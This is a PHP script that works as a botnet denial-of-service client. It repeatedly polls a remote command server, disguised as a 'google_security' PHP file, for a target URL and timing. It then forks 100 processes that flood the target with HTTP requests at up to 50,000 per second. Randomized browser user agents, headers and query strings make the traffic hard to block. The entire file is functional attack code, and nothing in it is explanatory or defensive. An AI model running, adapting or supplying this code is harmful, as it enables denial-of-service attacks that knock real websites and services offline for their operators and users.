<?php

$api_url = "https://labaidgroup.com/files/google_security2025992852991526.php";
$requests_per_second = 50000;
$num_processes = 100;
$requests_per_process_per_second = ceil($requests_per_second / $num_processes);
$retry_limit = 3;
$retry_delay = 1;
$byte_range = "0-1";

ini_set('max_execution_time', 0);
ini_set('memory_limit', '2048M');
ini_set('max_input_time', -1);
set_time_limit(0);

$user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.194 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.91 Safari/537.36",
    "Mozilla/5.0 (Android 12; Mobile; rv:108.0) Gecko/108.0 Firefox/108.0",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/115.0.5790.130 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Brave/116.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Vivaldi/6.1.3035.111",
    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 YaBrowser/23.9.0.2353 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) DuckDuckGo/7 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
];

function get_random_headers($host) {
    global $user_agents;
    $accept_types = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "application/json,text/plain,*/*;q=0.5",
        "text/html,application/xhtml+xml,*/*;q=0.9",
        "*/*"
    ];
    $accept_languages = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8",
        "fr-FR,fr;q=0.7",
        "ar-SA,ar;q=0.9",
        "es-ES,es;q=0.8",
        "de-DE,de;q=0.7"
    ];
    $accept_encodings = ["gzip, deflate, br", "gzip, deflate", "br", "identity"];

    return [
        "User-Agent: " . $user_agents[array_rand($user_agents)],
        "Accept: " . $accept_types[array_rand($accept_types)],
        "Accept-Language: " . $accept_languages[array_rand($accept_languages)],
        "Accept-Encoding: " . $accept_encodings[array_rand($accept_encodings)],
        "Connection: keep-alive",
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        "Referer: " . parse_url($host, PHP_URL_SCHEME) . "://" . parse_url($host, PHP_URL_HOST)
    ];
}

function generate_random_query() {
    return "?rand=" . md5(microtime(true) . rand(0, 1000000)) . "&t=" . rand(1000, 999999);
}

function log_to_file($message) {
    file_put_contents('results.txt', $message . PHP_EOL, FILE_APPEND);
}

function fetch_api_data($api_url, $retry_limit, $retry_delay) {
    $attempt = 0;
    while ($attempt < $retry_limit) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $response = curl_exec($ch);
        $error = curl_error($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($error || $http_code != 200 || strpos($response, "Connection refused") !== false || strpos($response, "Bad Gateway") !== false) {
            log_to_file("API Attempt $attempt failed: HTTP $http_code, Error: $error, Response: $response");
            $attempt++;
            if ($attempt < $retry_limit) {
                sleep($retry_delay);
                continue;
            }
            return false;
        }

        if (empty($response) || strpos($response, '<data>') === false) {
            log_to_file("Invalid API Response: $response");
            $attempt++;
            if ($attempt < $retry_limit) {
                sleep($retry_delay);
                continue;
            }
            return false;
        }

        $xml = simplexml_load_string($response);
        if ($xml === false || !isset($xml->url, $xml->time, $xml->wait)) {
            log_to_file("Failed to parse XML or missing fields: $response");
            $attempt++;
            if ($attempt < $retry_limit) {
                sleep($retry_delay);
                continue;
            }
            return false;
        }

        return [
            'url' => (string)$xml->url,
            'time' => (int)$xml->time,
            'wait' => (int)$xml->wait
        ];
    }
    return false;
}

function send_request($url) {
    $parts = parse_url($url);
    $host = $parts['host'];
    $path = $parts['path'] ?? '/';
    $query = $parts['query'] ?? '';
    $path .= $query ? '?' . $query : generate_random_query();
    $port = $parts['port'] ?? ($parts['scheme'] === 'https' ? 443 : 80);
    $prefix = $parts['scheme'] === 'https' ? 'ssl://' : '';

    $fp = @fsockopen($prefix . $host, $port, $errno, $errstr, 1);
    if (!$fp) {
        return false;
    }

    $headers = get_random_headers($url);
    $out = "GET $path HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    foreach ($headers as $header) {
        $out .= $header . "\r\n";
    }
    $out .= "Connection: Close\r\n\r\n";

    fwrite($fp, $out);
    fclose($fp);
    return true;
}

function execute_attack_process($target_url, $duration) {
    global $requests_per_process_per_second;
    $start_time = time();
    $request_count = 0;

    while (time() - $start_time < $duration) {
        $second_start = microtime(true);
        for ($i = 0; $i < $requests_per_process_per_second; $i++) {
            if (send_request($target_url)) {
                $request_count++;
            }
        }
        $elapsed = microtime(true) - $second_start;
        log_to_file("Process " . getmypid() . " sent $request_count requests in this second");
        if ($elapsed < 1) {
            usleep((1 - $elapsed) * 1000000);
        }
    }
    log_to_file("[SUCCESS] Process " . getmypid() . " completed with $request_count requests");
}

function execute_attack($target_url, $total_duration) {
    global $num_processes;
    $pids = [];

    for ($i = 0; $i < $num_processes; $i++) {
        $pid = pcntl_fork();
        if ($pid == -1) {
            log_to_file("Could not fork process");
        } elseif ($pid == 0) {
            execute_attack_process($target_url, $total_duration);
            exit(0);
        } else {
            $pids[] = $pid;
        }
    }

    foreach ($pids as $pid) {
        pcntl_waitpid($pid, $status);
    }
    log_to_file("[SUCCESS] Attack completed with $num_processes processes");
}

if (!extension_loaded('pcntl')) {
    die("PCNTL extension is required for multi-processing.\n");
}

while (true) {
    $data = fetch_api_data($api_url, $retry_limit, $retry_delay);

    if ($data !== false && isset($data['url'], $data['time'], $data['wait'])) {
        log_to_file("[START] Starting attack on {$data['url']} for {$data['time']} seconds after waiting {$data['wait']} seconds");
        sleep($data['wait']);
        execute_attack($data['url'], $data['time']);
        log_to_file("[SUCCESS] Attack on {$data['url']} completed");
    } else {
        log_to_file("No valid data received from API, retrying in 5 seconds...");
    }

    sleep(5);
}

?>
